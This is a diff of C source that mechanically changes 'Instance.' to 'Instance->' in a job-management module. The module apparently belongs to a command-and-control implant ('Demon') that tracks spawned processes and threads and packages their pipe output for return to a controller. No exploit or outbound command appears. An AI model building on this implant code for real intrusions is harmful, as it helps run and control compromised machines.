@@ -21,7 +21,7 @@ VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Hand
     PJOB_DATA JobList = NULL;
     PJOB_DATA Job     = NULL;
 
-    Job = Instance.Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );
+    Job = Instance->Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );
 
     // fill the Job info and insert it into our linked list
     Job->RequestID = RequestID;
@@ -32,13 +32,13 @@ VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Hand
     Job->Data      = Data;
     Job->Next      = NULL;
 
-    if ( Instance.Jobs == NULL )
+    if ( Instance->Jobs == NULL )
     {
-        Instance.Jobs = Job;
+        Instance->Jobs = Job;
         return;
     }
 
-    JobList = Instance.Jobs;
+    JobList = Instance->Jobs;
 
     do {
         if ( JobList )
@@ -64,7 +64,7 @@ VOID JobCheckList()
 {
     PJOB_DATA JobList = NULL;
 
-    JobList = Instance.Jobs;
+    JobList = Instance->Jobs;
 
     do {
         if ( ! JobList )
@@ -77,7 +77,7 @@ VOID JobCheckList()
                 if ( JobList->State == JOB_STATE_RUNNING )
                 {
                     DWORD Return = 0;
-                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Return );
+                    Instance->Win32.GetExitCodeProcess( JobList->Handle, &Return );
 
                     if ( Return != STILL_ACTIVE )
                         JobList->State = JOB_STATE_DEAD;
@@ -90,7 +90,7 @@ VOID JobCheckList()
                 if ( JobList->State == JOB_STATE_RUNNING )
                 {
                     DWORD Return = 0;
-                    Instance.Win32.GetExitCodeThread( JobList->Handle, &Return );
+                    Instance->Win32.GetExitCodeThread( JobList->Handle, &Return );
 
                     if ( Return != STILL_ACTIVE )
                         JobList->State = JOB_STATE_DEAD;
@@ -105,7 +105,7 @@ VOID JobCheckList()
                 {
                     DWORD Status = 0;
 
-                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Status );
+                    Instance->Win32.GetExitCodeProcess( JobList->Handle, &Status );
 
                     if ( Status != STILL_ACTIVE )
                     {
@@ -145,16 +145,16 @@ VOID JobCheckList()
                         PVOID Buffer    = NULL;
                         DWORD Size      = 0;
 
-                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
+                        if ( Instance->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                         {
                             PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );
 
                             if ( Available > 0 )
                             {
                                 Size   = Available;
-                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Size );
 
-                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
+                                if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
                                     PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
@@ -183,7 +183,7 @@ VOID JobCheckList()
  */
 BOOL JobSuspend( DWORD JobID )
 {
-    PJOB_DATA JobList = Instance.Jobs;
+    PJOB_DATA JobList = Instance->Jobs;
 
     while ( JobList )
     {
@@ -229,7 +229,7 @@ BOOL JobSuspend( DWORD JobID )
  */
 BOOL JobResume( DWORD JobID )
 {
-    PJOB_DATA JobList = Instance.Jobs;
+    PJOB_DATA JobList = Instance->Jobs;
 
     while ( JobList )
     {
@@ -277,7 +277,7 @@ BOOL JobResume( DWORD JobID )
 BOOL JobKill( DWORD JobID )
 {
     BOOL      Success = FALSE;
-    PJOB_DATA JobList = Instance.Jobs;
+    PJOB_DATA JobList = Instance->Jobs;
 
     while ( JobList )
     {
@@ -299,17 +299,17 @@ BOOL JobKill( DWORD JobID )
                         {
                             PUTS( "Kill using handle" )
 
-                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
+                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                             {
                                 PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
-                                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+                                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                                 PACKAGE_ERROR_WIN32;
                                 Success = FALSE;
                             }
                             else
                             {
                                 // remove one thread from counter
-                                Instance.Threads--;
+                                Instance->Threads--;
                             }
                         }
                         else
@@ -325,7 +325,7 @@ BOOL JobKill( DWORD JobID )
                 {
                     if ( JobList->State != JOB_STATE_DEAD )
                     {
-                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );
+                        Instance->Win32.TerminateProcess( JobList->Handle, 0 );
                     }
                     break;
                 }
@@ -334,22 +334,22 @@ BOOL JobKill( DWORD JobID )
                 {
                     if ( JobList->State != JOB_STATE_DEAD )
                     {
-                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );
+                        Instance->Win32.TerminateProcess( JobList->Handle, 0 );
 
                         // just read what there is available.
                         DWORD Available = 0;
                         PVOID Buffer    = NULL;
 
-                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
+                        if ( Instance->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                         {
                             PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );
 
                             if ( Available > 0 )
                             {
                                 DWORD Size = Available;
-                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Size );
 
-                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
+                                if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
                                     PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
@@ -388,14 +388,14 @@ VOID JobRemove( DWORD JobID )
     PJOB_DATA JobList     = NULL;
     PJOB_DATA JobToRemove = NULL;
 
-    if ( Instance.Jobs && Instance.Jobs->JobID == JobID )
+    if ( Instance->Jobs && Instance->Jobs->JobID == JobID )
     {
-        JobToRemove = Instance.Jobs;
-        Instance.Jobs = JobToRemove->Next;
+        JobToRemove = Instance->Jobs;
+        Instance->Jobs = JobToRemove->Next;
     }
     else
     {
-        JobList = Instance.Jobs;
+        JobList = Instance->Jobs;
 
         while ( JobList )
         {
@@ -426,6 +426,6 @@ VOID JobRemove( DWORD JobID )
     }
 
     MemSet( JobToRemove, 0, sizeof( JOB_DATA ) );
-    Instance.Win32.LocalFree( JobToRemove );
+    Instance->Win32.LocalFree( JobToRemove );
     JobToRemove = NULL;
 }
